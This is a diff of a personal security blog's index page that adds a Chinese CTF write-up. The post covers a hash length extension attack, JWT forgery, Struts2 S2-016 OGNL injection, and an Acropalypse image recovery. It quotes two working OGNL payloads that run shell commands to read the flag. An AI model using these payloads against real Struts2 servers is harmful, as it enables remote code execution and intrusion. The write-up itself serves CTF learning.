@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -183,6 +183,117 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/85812b61.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="Keep Hacking">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/post/85812b61.html" class="post-title-link" itemprop="url">XCTF简单记录</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-07-31 16:04:01 / 修改时间：16:05:27" itemprop="dateCreated datePublished" datetime="2023-07-31T16:04:01+08:00">2023-07-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <span id="more"></span> 
+
+<p>web狗没啥参与感</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p>web就一道题目 </p>
+<h2 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2><p>考点：</p>
+<p>哈希长度扩展攻击 jwt伪造 structs2 s2-016</p>
+<p>源码发现<code>JWT_key.php</code>     </p>
+<p>获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大致浏览 就是要么我们能得到他的盐值 要么输入密码为root 但是又不容许我们输入密码为root</p>
+<p>总之就是要让<code>$_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)</code>成立</p>
+<p>直接用hashpump参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hashpump&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/jblock/article/details/78448143?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hashpump&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-78448143.nonecase&amp;spm=1018.2226.3001.4187</a></p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690788963635-a551229f-e941-4ec8-a654-cd95298a7d88.png" alt="img"></p>
+<p>得到之后打入</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789103062-9ee0da7c-da07-4285-bdf4-1cb8e0e84fb6.png" alt="img"></p>
+<p>得到jwt的key为<code>sk-he00lctf3r</code>然后伪造登录</p>
+<p>发现源码提示 do you know struts2?</p>
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式  </p>
+<p>官方wp是在age注入<code>%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27</code> 但是我之后复现没成功 没有回显</p>
+<p>但是我的payload是这样 可能是非预期 来源 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4603">https://xz.aliyun.com/t/4603</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admiiiiiiiiiiin/user.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /flag%27%29.getInputStream%28%29%29%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690789835158-46956817-70ad-4e98-8494-b82ba94c3915.png" alt="img"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="snippingTools"><a href="#snippingTools" class="headerlink" title="snippingTools"></a>snippingTools</h2><p>CVE-2023-28303  </p>
+<p>比赛的时候找到工具了 没试 我TM。。。。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">https://github.com/frankthetank-music/Acropalypse-Multi-Tool</a> 直接用工具梭哈恢复就行了</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787514977-7cf9931f-6f99-436e-9048-ffe0dda8874e.png" alt="img"></p>
+<h2 id="old-language"><a href="#old-language" class="headerlink" title="old language"></a>old language</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787906068-9d4f095e-a3c1-4ec2-887c-e53980fa8cc8.png" alt="img"></p>
+<p>太离谱了这个 </p>
+<p>龙语，游戏《上古卷轴V：天际》中出现的语言</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690787993320-76273c76-7cba-48e8-a7c2-6f63851b7730.jpeg" alt="img"></p>
+<p>*<strong>ctf{GIKRVZY}</strong> </p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -972,98 +1083,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/post/ba5897f5.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/post/96d146ad.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
-      <meta itemprop="name" content="Z1d10t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Z1d10tのBlog">
-      <meta itemprop="description" content="Keep Hacking">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Z1d10tのBlog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/post/96d146ad.html" class="post-title-link" itemprop="url">2023年 第三届陕西省大学生网络安全技能大赛（本科高校组）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-06-07 00:01:00" itemprop="dateCreated datePublished" datetime="2023-06-07T00:01:00+08:00">2023-06-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-06-25 19:30:48" itemprop="dateModified" datetime="2023-06-25T19:30:48+08:00">2023-06-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/" itemprop="url" rel="index"><span itemprop="name">各赛事WP</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>2023年 第三届陕西省大学生网络安全技能大赛（本科高校组） web misc复现</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/post/96d146ad.html#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
